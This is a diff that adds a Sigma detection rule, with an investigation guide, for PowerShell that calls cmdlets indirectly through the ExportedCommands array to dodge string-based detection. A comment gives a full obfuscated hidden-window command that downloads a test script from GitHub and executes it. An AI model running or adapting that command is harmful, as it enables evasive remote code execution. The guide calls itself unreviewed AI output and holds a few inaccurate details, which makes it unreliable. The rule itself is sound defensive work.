@@ -1,0 +1,78 @@
+title: PowerShell Dynamic Module Invocation Via ExportedCommands Array Index
+id: 0c3ebe9f-df09-4e00-be0f-73d4ca8d62f6
+related:
+- id: 4ff4ad3e-9fb5-4a70-9962-d6ea58090318
+  type: similar
+status: experimental
+description: |
+  Detects PowerShell processes invoked with obfuscated command lines that enumerate Microsoft.PowerShell.Utility
+  exported commands and invoke cmdlets indirectly by array index. This technique is used to evade
+  detections that look for explicit strings such as Invoke-RestMethod or Invoke-Expression.
+references:
+- https://www.linkedin.com/posts/mark-o-halloran1_clickfix-defense-evasion-tactic-today-i-ugcPost-7453463467736408064-snrp/
+author: Norbert Jaśniewicz (AlphaSOC), Swachchhanda Shrawan Poudel (Nextron 
+  Systems)
+date: 2026-10-06
+tags:
+- attack.execution
+- attack.stealth
+- attack.t1027.010
+- attack.t1059.001
+logsource:
+  product: windows
+  category: process_creation
+detection:
+    # powershell.exe -NoP -W Hidden -C "$kp=12;$sEzg=32;$cSX=((Get-Module -ListAvailable 'Microsoft.PowerShell.Utility')).ExportedCommands.Values;$cSX=$cSX.Name;& $cSX[$kp] 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1' -OutFile C:\Temp\maldoc.ps1;$qJgm=$cSX[$sEzg];& $qJgm (Get-Content C:\Temp\maldoc.ps1 -Raw)"
+  selection_img:
+  - Image|endswith:
+    - '\powershell.exe'
+    - '\pwsh.exe'
+  - OriginalFileName:
+    - 'powershell.exe'
+    - 'pwsh.dll'
+  selection_module_export_enum:
+    CommandLine|contains:
+    - 'Get-Module '
+    - 'gmo '
+    CommandLine|contains|all:
+    - 'ListAvailable'
+    - 'Microsoft.PowerShell.Utility'
+    - 'ExportedCommands'
+    - 'Values'
+  selection_index_used:
+    CommandLine|contains: '[*]'
+  condition: all of selection_*
+falsepositives:
+- Legitimate use of exported commands array indexing during PowerShell command 
+  execution (should be rare)
+level: high
+regression_tests_path: 
+  regression_data/rules/windows/process_creation/proc_creation_win_powershell_cmdlet_invocation_via_exported_commands_array_index/info.yml
+note: |
+  ### Technical Context
+
+  This Sigma rule detects PowerShell commands that utilize obfuscated, indirect invocation of cmdlets from the Microsoft.PowerShell.Utility module through array indexing of the ExportedCommands property. The likely attacker objective is to execute malicious scripts while evading detection mechanisms that typically observe explicit command strings, such as `Invoke-RestMethod`. This behavior aligns with the MITRE ATT&CK technique for Command and Control (T1086: PowerShell) and Execution (T1059.001: PowerShell). The primary telemetry sources include process creation logs from Windows (Event ID 4688) and PowerShell command line activity. If successful, this could lead to unauthorized execution of malicious code. Importantly, this detection does NOT confirm malicious intent on its own, as legitimate scenarios may involve similar behavior under specific conditions.
+
+  ### Investigation Steps
+
+  - **Review suspicious command lines:** Examine process creation logs for Event ID 4688, particularly for PowerShell processes with CommandLine containing `Get-Module -ListAvailable 'Microsoft.PowerShell.Utility'` and `ExportedCommands.Values`. Malicious commands typically utilize complex obfuscation and index array accesses.
+
+  - **Identify legitimate PowerShell usage:** Look for standard usage patterns where ExportedCommands array indexing is employed in a non-obfuscated context, which should be rare. Expected command lines usually have clear, recognizable cmdlet names without excessive obfuscation.
+
+  - **Check for known malicious indicators:** Investigate any URLs in command lines pointing to external scripts (for example, a URL containing `raw.githubusercontent.com`). If detected, validate whether it leads to known malicious scripts listed in threat intelligence sources.
+
+  - **Verify file creation and exfiltration:** Validate file system activity where files are created in unusual paths, such as `C:\Temp\maldoc.ps1`. Use file creation timestamps to check if the script corresponds to the process invocations.
+
+  - **Analyze process parentage:** Check process lineage to confirm whether the PowerShell command was spawned from a trusted process or suspicious parent. Leverage Sysmon Event ID  ParentImage to trace lineage.
+
+  - **Cross-reference with other detections:** Look for companion detections, such as Unauthorized PowerShell module loading or network connections (based on corresponding alerts) which can strengthen the context around the alert.
+
+  ### Prioritization
+
+  This alert is high priority due to the potential of invoking malicious scripts in the environment, particularly if the affected system has critical assets or sensitive data. The obfuscated nature of the command increases the likelihood of misuse, and similar techniques are increasingly observed in real-world attacks against enterprises.
+
+  ### Blind Spots and Assumptions
+
+  Evasion techniques may include more complex obfuscation of command lines that are not caught by simplistic pattern matches. Reliable detection requires the comprehensive logging of PowerShell events and configurations to capture all relevant telemetry. Furthermore, legitimate administrative activities may utilize similar command patterns for valid use cases. A related detection to consider is PowerShell command execution that includes typical obfuscation sequences as a complementary detection strategy.
+
+  > **Disclaimer:** This investigation guide was created using generative AI technology and has not been reviewed for its accuracy and relevance. While every effort has been made to ensure its quality, we recommend validating the content and adapting it to suit specific environments and operational needs. Please communicate any changes to the detection engineering team.
